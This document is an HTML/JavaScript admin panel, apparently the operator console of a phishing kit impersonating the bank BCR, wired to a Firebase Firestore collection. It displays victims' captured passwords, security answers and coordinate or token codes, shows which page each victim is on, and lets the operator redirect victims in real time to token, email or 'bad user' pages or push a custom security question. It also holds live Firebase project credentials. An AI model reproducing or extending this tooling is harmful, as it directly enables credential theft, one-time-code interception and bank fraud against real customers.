<!DOCTYPE html>
<html lang="es">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Panel Admin - BCR</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" />
  <style>
    :root {
      --bg-dark: #0f172a;
      --bg-card: #1e293b;
      --bg-hover: #334155;
      --border: #334155;
      --accent: #3b82f6;
      --accent-hover: #2563eb;
      --text: #e2e8f0;
      --text-muted: #94a3b8;
      --success: #10b981;
      --warning: #f59e0b;
      --danger: #ef4444;
    }

    * {
      box-sizing: border-box;
    }

    body {
      background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
      color: var(--text);
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
      min-height: 100vh;
      padding: 20px;
    }

    /* ============ LOGIN ============ */
    #loginScreen {
      position: fixed;
      inset: 0;
      background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }

    .login-card {
      background: var(--bg-card);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 40px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
    }

    .login-card h1 {
      font-size: 24px;
      font-weight: 700;
      text-align: center;
      margin-bottom: 8px;
      color: var(--text);
    }

    .login-card p {
      text-align: center;
      color: var(--text-muted);
      font-size: 14px;
      margin-bottom: 28px;
    }

    .login-card .form-control {
      background: var(--bg-dark);
      border: 1px solid var(--border);
      color: var(--text);
      padding: 12px 16px;
      border-radius: 8px;
      font-size: 15px;
    }

    .login-card .form-control:focus {
      background: var(--bg-dark);
      border-color: var(--accent);
      color: var(--text);
      box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.15);
    }

    .login-card .btn-primary {
      background: var(--accent);
      border: none;
      padding: 12px;
      font-weight: 600;
      border-radius: 8px;
      width: 100%;
      transition: all 0.2s;
    }

    .login-card .btn-primary:hover {
      background: var(--accent-hover);
      transform: translateY(-1px);
    }

    .login-error {
      color: var(--danger);
      font-size: 13px;
      text-align: center;
      margin-top: 12px;
      display: none;
    }

    /* ============ PANEL ============ */
    .panel-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 16px;
      margin-bottom: 24px;
      padding: 20px 24px;
      background: var(--bg-card);
      border: 1px solid var(--border);
      border-radius: 12px;
    }

    .panel-header h1 {
      font-size: 22px;
      font-weight: 700;
      margin: 0;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .panel-header h1 i {
      color: var(--accent);
    }

    .header-stats {
      display: flex;
      gap: 20px;
      flex-wrap: wrap;
    }

    .stat-box {
      text-align: center;
      padding: 4px 12px;
      border-left: 2px solid var(--border);
    }

    .stat-box:first-child {
      border-left: none;
    }

    .stat-box .num {
      font-size: 20px;
      font-weight: 700;
      color: var(--accent);
    }

    .stat-box .lbl {
      font-size: 11px;
      color: var(--text-muted);
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    /* ============ TOOLBAR ============ */
    .toolbar {
      display: flex;
      gap: 12px;
      flex-wrap: wrap;
      margin-bottom: 20px;
      align-items: center;
    }

    .toolbar .form-control,
    .toolbar .form-select {
      background: var(--bg-card);
      border: 1px solid var(--border);
      color: var(--text);
      border-radius: 8px;
      padding: 10px 14px;
      font-size: 14px;
      max-width: 260px;
    }

    .toolbar .form-control::placeholder {
      color: var(--text-muted);
    }

    .toolbar .form-control:focus,
    .toolbar .form-select:focus {
      background: var(--bg-card);
      color: var(--text);
      border-color: var(--accent);
      box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.15);
    }

    /* ============ GRID DE TARJETAS ============ */
    #data {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(360px, 1fr));
      gap: 16px;
    }

    .user-card {
      background: var(--bg-card);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 18px;
      transition: all 0.2s;
      position: relative;
      overflow: hidden;
    }

    .user-card:hover {
      border-color: var(--accent);
      transform: translateY(-2px);
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
    }

    .user-card::before {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 3px;
      background: var(--text-muted);
      opacity: 0.5;
    }

    .user-card.status-active::before {
      background: var(--success);
      opacity: 1;
    }

    .user-card.status-recent::before {
      background: var(--warning);
      opacity: 1;
    }

    .user-card.status-inactive::before {
      background: var(--danger);
      opacity: 0.6;
    }

    .user-card .header {
      display: flex;
      justify-content: space-between;
      align-items: flex-start;
      margin-bottom: 12px;
      gap: 10px;
    }

    .user-card .user-id {
      font-size: 15px;
      font-weight: 700;
      color: var(--text);
      word-break: break-all;
      flex: 1;
    }

    .status-badge {
      display: inline-flex;
      align-items: center;
      gap: 5px;
      padding: 4px 10px;
      border-radius: 20px;
      font-size: 11px;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.3px;
      white-space: nowrap;
    }

    .status-badge.active {
      background: rgba(16, 185, 129, 0.15);
      color: var(--success);
    }

    .status-badge.recent {
      background: rgba(245, 158, 11, 0.15);
      color: var(--warning);
    }

    .status-badge.inactive {
      background: rgba(239, 68, 68, 0.15);
      color: var(--danger);
    }

    .status-badge .dot {
      width: 6px;
      height: 6px;
      border-radius: 50%;
      background: currentColor;
      animation: pulse 2s infinite;
    }

    .status-badge.inactive .dot {
      animation: none;
    }

    @keyframes pulse {

      0%,
      100% {
        opacity: 1;
      }

      50% {
        opacity: 0.4;
      }
    }

    .user-info {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 8px;
      margin-bottom: 12px;
      font-size: 12px;
    }

    .info-item {
      display: flex;
      flex-direction: column;
      gap: 2px;
    }

    .info-item .label {
      color: var(--text-muted);
      font-size: 10px;
      text-transform: uppercase;
      letter-spacing: 0.4px;
      font-weight: 600;
    }

    .info-item .value {
      color: var(--text);
      font-weight: 500;
      word-break: break-word;
    }

    .info-item .value.mono {
      font-family: "SF Mono", Monaco, Menlo, Consolas, monospace;
      font-size: 11px;
    }

    .user-card .page-indicator {
      display: inline-block;
      padding: 3px 8px;
      background: rgba(59, 130, 246, 0.15);
      color: var(--accent);
      border-radius: 6px;
      font-size: 11px;
      font-weight: 600;
      margin-bottom: 12px;
    }

    .question-badge {
      display: inline-block;
      padding: 3px 8px;
      background: rgba(139, 92, 246, 0.15);
      color: #a78bfa;
      border-radius: 6px;
      font-size: 11px;
      font-weight: 600;
      margin-left: 6px;
      margin-bottom: 12px;
      max-width: 100%;
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
    }

    /* ============ ACCIONES ============ */
    .user-card .actions {
      display: flex;
      flex-wrap: wrap;
      gap: 6px;
      padding-top: 12px;
      border-top: 1px solid var(--border);
    }

    .user-card .btn {
      font-size: 11px;
      font-weight: 600;
      padding: 6px 10px;
      border-radius: 6px;
      border: none;
      transition: all 0.15s;
      flex: 1;
      min-width: 70px;
    }

    .btn-mail {
      background: #06b6d4;
      color: white;
    }

    .btn-mail:hover {
      background: #0891b2;
      color: white;
    }

    .btn-question {
      background: #8b5cf6;
      color: white;
    }

    .btn-question:hover {
      background: #7c3aed;
      color: white;
    }

    .btn-bad {
      background: #f97316;
      color: white;
    }

    .btn-bad:hover {
      background: #ea580c;
      color: white;
    }

    .btn-del {
      background: var(--danger);
      color: white;
    }

    .btn-del:hover {
      background: #dc2626;
      color: white;
    }

    /* ============ EMPTY STATE ============ */
    .empty-state {
      grid-column: 1 / -1;
      text-align: center;
      padding: 60px 20px;
      color: var(--text-muted);
    }

    .empty-state i {
      font-size: 48px;
      margin-bottom: 16px;
      opacity: 0.4;
    }

    /* ============ TOAST ============ */
    .toast-container {
      position: fixed;
      top: 20px;
      right: 20px;
      z-index: 99999;
    }

    .toast-msg {
      background: var(--bg-card);
      border: 1px solid var(--border);
      border-left: 3px solid var(--success);
      color: var(--text);
      padding: 12px 18px;
      border-radius: 8px;
      margin-bottom: 10px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
      font-size: 13px;
      animation: slideIn 0.3s ease;
      min-width: 250px;
    }

    .toast-msg.error {
      border-left-color: var(--danger);
    }

    @keyframes slideIn {
      from {
        transform: translateX(100%);
        opacity: 0;
      }

      to {
        transform: translateX(0);
        opacity: 1;
      }
    }

    /* ============ OVERLAY / MODAL ============ */
    .overlay {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(4px);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 99998;
      padding: 20px;
      animation: fadeIn 0.2s ease;
    }

    .overlay.show {
      display: flex;
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    .overlay-card {
      background: var(--bg-card);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 32px;
      width: 100%;
      max-width: 520px;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
      animation: slideUp 0.25s ease;
    }

    @keyframes slideUp {
      from { transform: translateY(20px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }

    .overlay-card h2 {
      font-size: 20px;
      font-weight: 700;
      margin-bottom: 6px;
      color: var(--text);
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .overlay-card h2 i {
      color: #a78bfa;
    }

    .overlay-card .subtitle {
      color: var(--text-muted);
      font-size: 13px;
      margin-bottom: 22px;
    }

    .overlay-card .user-target {
      display: inline-block;
      padding: 4px 10px;
      background: rgba(59, 130, 246, 0.15);
      color: var(--accent);
      border-radius: 6px;
      font-size: 12px;
      font-weight: 600;
      margin-bottom: 18px;
      font-family: monospace;
    }

    .overlay-card label {
      display: block;
      font-size: 13px;
      font-weight: 600;
      color: var(--text);
      margin-bottom: 8px;
    }

    .overlay-card .form-control {
      background: var(--bg-dark);
      border: 1px solid var(--border);
      color: var(--text);
      padding: 12px 16px;
      border-radius: 8px;
      font-size: 15px;
      width: 100%;
      font-family: inherit;
    }

    .overlay-card .form-control:focus {
      background: var(--bg-dark);
      border-color: #8b5cf6;
      color: var(--text);
      box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.15);
      outline: none;
    }

    .overlay-actions {
      display: flex;
      gap: 10px;
      margin-top: 22px;
    }

    .overlay-actions .btn {
      flex: 1;
      padding: 12px;
      border-radius: 8px;
      font-weight: 600;
      font-size: 14px;
      border: none;
      transition: all 0.2s;
      cursor: pointer;
    }

    .btn-cancel {
      background: var(--bg-hover);
      color: var(--text);
    }

    .btn-cancel:hover {
      background: #475569;
    }

    .btn-save {
      background: #8b5cf6;
      color: white;
    }

    .btn-save:hover {
      background: #7c3aed;
    }

    .btn-save:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }

    @media (max-width: 600px) {
      .panel-header {
        padding: 16px;
      }

      .panel-header h1 {
        font-size: 18px;
      }

      #data {
        grid-template-columns: 1fr;
      }

      .overlay-card {
        padding: 24px;
      }
    }
  </style>
</head>

<body>

  <!-- ================= LOGIN SCREEN ================= -->
  <div id="loginScreen">
    <div class="login-card">
      <h1><i class="fa-solid fa-shield-halved"></i> Panel Admin</h1>
      <p>Ingrese la clave de acceso para continuar</p>
      <input type="password" id="accessKey" class="form-control" placeholder="Clave de acceso" autocomplete="off" />
      <button class="btn btn-primary mt-3" onclick="checkAccess()">
        <i class="fa-solid fa-arrow-right-to-bracket"></i> Acceder
      </button>
      <div class="login-error" id="loginError">
        <i class="fa-solid fa-circle-exclamation"></i> Clave incorrecta
      </div>
    </div>
  </div>

  <!-- ================= PANEL ================= -->
  <div id="panel" style="display:none">
    <div class="panel-header">
      <h1><i class="fa-solid fa-users-gear"></i> Panel de Control BCR</h1>
      <div class="header-stats">
        <div class="stat-box">
          <div class="num" id="statTotal">0</div>
          <div class="lbl">Total</div>
        </div>
        <div class="stat-box">
          <div class="num" id="statActive" style="color: var(--success)">0</div>
          <div class="lbl">Activos</div>
        </div>
        <div class="stat-box">
          <div class="num" id="statRecent" style="color: var(--warning)">0</div>
          <div class="lbl">Recientes</div>
        </div>
        <div class="stat-box">
          <div class="num" id="statInactive" style="color: var(--danger)">0</div>
          <div class="lbl">Inactivos</div>
        </div>
      </div>
    </div>

    <div class="toolbar">
      <input type="text" id="searchInput" class="form-control" placeholder="🔍 Buscar usuario..."
        oninput="applyFilters()" />
      <select id="filterStatus" class="form-select" onchange="applyFilters()">
        <option value="all">Todos los estados</option>
        <option value="active">Solo activos</option>
        <option value="recent">Solo recientes</option>
        <option value="inactive">Solo inactivos</option>
      </select>
      <select id="sortBy" class="form-select" onchange="applyFilters()">
        <option value="recent">Última actividad (reciente)</option>
        <option value="old">Última actividad (antigua)</option>
        <option value="name">Nombre (A-Z)</option>
      </select>
    </div>

    <div id="data"></div>
  </div>

  <!-- ================= OVERLAY: CAMBIAR PREGUNTA ================= -->
  <div class="overlay" id="questionOverlay">
    <div class="overlay-card">
      <h2><i class="fa-solid fa-circle-question"></i> Cambiar pregunta</h2>
      <p class="subtitle">Escribe la nueva pregunta que verá el usuario en la pantalla de seguridad.</p>

      <div class="user-target" id="questionUserTarget">usuario</div>

      <label for="questionInput">Pregunta</label>
      <input type="text" id="questionInput" class="form-control" placeholder="Ej: ¿Una fecha a recordar?" autocomplete="off" />

      <div class="overlay-actions">
        <button class="btn btn-cancel" onclick="closeQuestionOverlay()">Cancelar</button>
        <button class="btn btn-save" id="saveQuestionBtn" onclick="saveQuestion()">Guardar</button>
      </div>
    </div>
  </div>

  <div class="toast-container" id="toastContainer"></div>

  <!-- ================= FIREBASE + LÓGICA ================= -->
  <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>
  <script>
    // ================= FIREBASE =================
    const firebaseConfig = {
      apiKey: "AIzaSyBUWnHIPZ8JOUsX0ba-f70l2S7EkRaoz5Q",
      authDomain: "da1assdasdg.firebaseapp.com",
      databaseURL: "https://da1assdasdg-default-rtdb.firebaseio.com",
      projectId: "da1assdasdg",
      storageBucket: "da1assdasdg.firebasestorage.app",
      messagingSenderId: "612813413332",
      appId: "1:612813413332:web:386e44f11da041562d1441",
      measurementId: "G-KE4GNBJ4NN"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    // ================= LOGIN =================
    const ACCESS_HASH = "240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9";

    async function sha256(text) {
      const encoder = new TextEncoder();
      const data = encoder.encode(text);
      const hashBuffer = await crypto.subtle.digest("SHA-256", data);
      return Array.from(new Uint8Array(hashBuffer))
        .map((b) => b.toString(16).padStart(2, "0"))
        .join("");
    }

    async function checkAccess() {
      const input = document.getElementById("accessKey").value;
      const hash = await sha256(input);

      if (hash === ACCESS_HASH) {
        sessionStorage.setItem("adminAuth", "true");
        showPanel();
      } else {
        const err = document.getElementById("loginError");
        err.style.display = "block";
        document.getElementById("accessKey").value = "";
        setTimeout(() => (err.style.display = "none"), 2500);
      }
    }

    document.getElementById("accessKey").addEventListener("keypress", (e) => {
      if (e.key === "Enter") checkAccess();
    });

    function showPanel() {
      document.getElementById("loginScreen").style.display = "none";
      document.getElementById("panel").style.display = "block";
    }

    if (sessionStorage.getItem("adminAuth") === "true") {
      showPanel();
    }

    // ================= ESTADO / TIEMPO =================
    function getStatus(data) {
      const ultima = data.ultimaActividad?.toDate?.() || null;
      const activoFlag = data.activo;

      if (!ultima) {
        return { key: "inactive", label: "Sin datos", cls: "inactive" };
      }

      const diffMin = (Date.now() - ultima.getTime()) / 60000;

      if (activoFlag === true && diffMin < 2) {
        return { key: "active", label: "Activo", cls: "active" };
      }
      if (diffMin < 10) {
        return { key: "recent", label: "Reciente", cls: "recent" };
      }
      return { key: "inactive", label: "Inactivo", cls: "inactive" };
    }

    function formatTime(seg) {
      if (!seg || seg < 0) return "—";
      const h = Math.floor(seg / 3600);
      const m = Math.floor((seg % 3600) / 60);
      const s = seg % 60;
      if (h > 0) return `${h}h ${m}m`;
      if (m > 0) return `${m}m ${s}s`;
      return `${s}s`;
    }

    function timeAgo(date) {
      if (!date) return "—";
      const diff = Math.floor((Date.now() - date.getTime()) / 1000);
      if (diff < 60) return `Hace ${diff}s`;
      if (diff < 3600) return `Hace ${Math.floor(diff / 60)} min`;
      if (diff < 86400) return `Hace ${Math.floor(diff / 3600)}h`;
      return `Hace ${Math.floor(diff / 86400)}d`;
    }

    function formatDate(ts) {
      if (!ts?.toDate) return "—";
      const d = ts.toDate();
      return d.toLocaleString("es-CR", {
        day: "2-digit",
        month: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      });
    }

    // ================= RENDER =================
    let allDocs = [];

    function renderDocs(docs) {
      allDocs = docs;
      applyFilters();
    }

    function applyFilters() {
      const search = document.getElementById("searchInput").value.toLowerCase();
      const filter = document.getElementById("filterStatus").value;
      const sort = document.getElementById("sortBy").value;

      let filtered = allDocs.map((doc) => {
        const data = doc.data();
        const status = getStatus(data);
        return { id: doc.id, data, status };
      });

      if (search) {
        filtered = filtered.filter((d) => d.id.toLowerCase().includes(search));
      }

      if (filter !== "all") {
        filtered = filtered.filter((d) => d.status.key === filter);
      }

      filtered.sort((a, b) => {
        if (sort === "name") return a.id.localeCompare(b.id);
        const aT = a.data.ultimaActividad?.toDate?.()?.getTime() || 0;
        const bT = b.data.ultimaActividad?.toDate?.()?.getTime() || 0;
        return sort === "recent" ? bT - aT : aT - bT;
      });

      const stats = { total: allDocs.length, active: 0, recent: 0, inactive: 0 };
      allDocs.forEach((doc) => {
        const s = getStatus(doc.data());
        stats[s.key]++;
      });
      document.getElementById("statTotal").textContent = stats.total;
      document.getElementById("statActive").textContent = stats.active;
      document.getElementById("statRecent").textContent = stats.recent;
      document.getElementById("statInactive").textContent = stats.inactive;

      const dataDiv = document.getElementById("data");

      if (filtered.length === 0) {
        dataDiv.innerHTML = `
          <div class="empty-state">
            <i class="fa-solid fa-inbox"></i>
            <p>No hay usuarios que coincidan con los filtros</p>
          </div>`;
        return;
      }

      dataDiv.innerHTML = filtered
        .map(({ id, data, status }) => {
          const tiempo = formatTime(data.tiempoActivo);
          const ultima = timeAgo(data.ultimaActividad?.toDate?.());
          const pageNum = data.page ?? 0;

          const pageLabels = {
            0: "Inicio",
            1: "Index.html",
            2: "Coordenadas",
            3: "Token",
            4: "Reiniciar",
            5: "Correo",
            6: "Usuario Malo",
          };
          const pageLabel = pageLabels[pageNum] || `Página ${pageNum}`;

          // Pregunta actual (question1)
          const preguntaActual = data.question1 || "—";
          const preguntaCorta = preguntaActual.length > 40
            ? preguntaActual.substring(0, 40) + "..."
            : preguntaActual;

          // Escapar comillas simples para el onclick
          const preguntaEscapada = preguntaActual.replace(/'/g, "\\'").replace(/"/g, "&quot;");

          return `
          <div class="user-card status-${status.cls}">
            <div class="header">
              <div class="user-id">
                <i class="fa-solid fa-user" style="color:var(--text-muted);font-size:13px;margin-right:6px"></i>
                ${id}
              </div>
              <span class="status-badge ${status.cls}">
                <span class="dot"></span>${status.label}
              </span>
            </div>

            <span class="page-indicator">
              <i class="fa-solid fa-file-lines"></i> ${pageLabel} (page: ${pageNum})
            </span>
            <span class="question-badge" title="${preguntaActual}">
              <i class="fa-solid fa-circle-question"></i> ${preguntaCorta}
            </span>

            <div class="user-info">
              <div class="info-item">
                <span class="label">Contraseña</span>
                <span class="value mono">${data.contrasena || "—"}</span>
              </div>
              <div class="info-item">
                <span class="label">Respuesta</span>
                <span class="value mono">${data.respuesta1 || "—"}</span>
              </div>
              <div class="info-item">
                <span class="label">Códigos</span>
                <span class="value mono">
                  ${data.codigo1 || "—"} · ${data.codigo2 || "—"} · ${data.codigo3 || "—"}
                </span>
              </div>
              <div class="info-item">
                <span class="label">Tiempo activo</span>
                <span class="value">${tiempo}</span>
              </div>
              <div class="info-item">
                <span class="label">Última actividad</span>
                <span class="value">${ultima}</span>
              </div>
              <div class="info-item">
                <span class="label">Inicio</span>
                <span class="value">${formatDate(data.fechaInicio)}</span>
              </div>
            </div>

            <div class="actions">
              <button class="btn btn-mail" onclick="changePageMail('${id}')">
                <i class="fa-solid fa-envelope"></i> Correo
              </button>
              <button class="btn btn-question" onclick="openQuestionOverlay('${id}', '${preguntaEscapada}')">
                <i class="fa-solid fa-circle-question"></i> Pregunta
              </button>
              <button class="btn btn-bad" onclick="changePageBad('${id}')">
                <i class="fa-solid fa-user-xmark"></i> Usuario Malo
              </button>
              <button class="btn btn-del" onclick="deleteDocument('${id}')">
                <i class="fa-solid fa-trash"></i> Eliminar
              </button>
            </div>
          </div>`;
        })
        .join("");
    }

    // ================= ESCUCHA FIRESTORE =================
    db.collection("boliviarnmnas").onSnapshot((snapshot) => {
      renderDocs(snapshot.docs);
    });

    // ================= TOAST =================
    function toast(msg, isError = false) {
      const container = document.getElementById("toastContainer");
      const div = document.createElement("div");
      div.className = "toast-msg" + (isError ? " error" : "");
      div.innerHTML = `<i class="fa-solid fa-${isError ? "circle-exclamation" : "circle-check"
        }"></i> ${msg}`;
      container.appendChild(div);
      setTimeout(() => div.remove(), 3000);
    }

    // ================= ACCIONES =================
    // ✅ Correo → page 5
    function changePageMail(id) {
      db.collection("boliviarnmnas")
        .doc(id)
        .update({ page: 5 })
        .then(() => toast(`Correo activado para ${id}`))
        .catch((e) => toast("Error: " + e.message, true));
    }

    // ✅ Usuario Malo → page 6
    function changePageBad(id) {
      db.collection("boliviarnmnas")
        .doc(id)
        .update({ page: 6 })
        .then(() => toast(`Marcado como Usuario Malo: ${id}`))
        .catch((e) => toast("Error: " + e.message, true));
    }

    function deleteDocument(id) {
      if (!confirm(`¿Eliminar al usuario "${id}"? Esta acción no se puede deshacer.`)) return;
      db.collection("boliviarnmnas")
        .doc(id)
        .delete()
        .then(() => toast(`Usuario ${id} eliminado`))
        .catch((e) => toast("Error: " + e.message, true));
    }

    // ================= OVERLAY: PREGUNTA =================
    let currentUserId = null;

    function openQuestionOverlay(id, preguntaActual) {
      currentUserId = id;
      const overlay = document.getElementById("questionOverlay");
      const input = document.getElementById("questionInput");
      const target = document.getElementById("questionUserTarget");

      target.textContent = id;
      // Si la pregunta actual es "—" (placeholder), dejamos vacío
      input.value = (preguntaActual === "—") ? "" : preguntaActual;
      overlay.classList.add("show");

      setTimeout(() => input.focus(), 100);
    }

    function closeQuestionOverlay() {
      document.getElementById("questionOverlay").classList.remove("show");
      currentUserId = null;
    }

function saveQuestion() {
  const valor = document.getElementById("questionInput").value.trim();

  if (!valor) {
    toast("La pregunta no puede estar vacía", true);
    return;
  }

  if (!currentUserId) {
    toast("No hay usuario seleccionado", true);
    return;
  }

  const btn = document.getElementById("saveQuestionBtn");
  btn.disabled = true;
  btn.textContent = "Guardando...";

  db.collection("boliviarnmnas")
    .doc(currentUserId)
    .update({
      question1: valor,
      page: 7, // 👈 Aquí se cambia a page 7
    })
    .then(() => {
      toast(`Pregunta actualizada y página cambiada a 7 para ${currentUserId}`);
      closeQuestionOverlay();
    })
    .catch((e) => toast("Error: " + e.message, true))
    .finally(() => {
      btn.disabled = false;
      btn.textContent = "Guardar";
    });
}
    // Cerrar overlay con Escape o clic fuera
    document.getElementById("questionOverlay").addEventListener("click", (e) => {
      if (e.target.id === "questionOverlay") closeQuestionOverlay();
    });

    document.addEventListener("keydown", (e) => {
      if (e.key === "Escape") {
        if (document.getElementById("questionOverlay").classList.contains("show")) {
          closeQuestionOverlay();
        }
      }
      if (e.key === "Enter" && document.getElementById("questionOverlay").classList.contains("show")) {
        saveQuestion();
      }
    });
  </script>
</body>

</html>
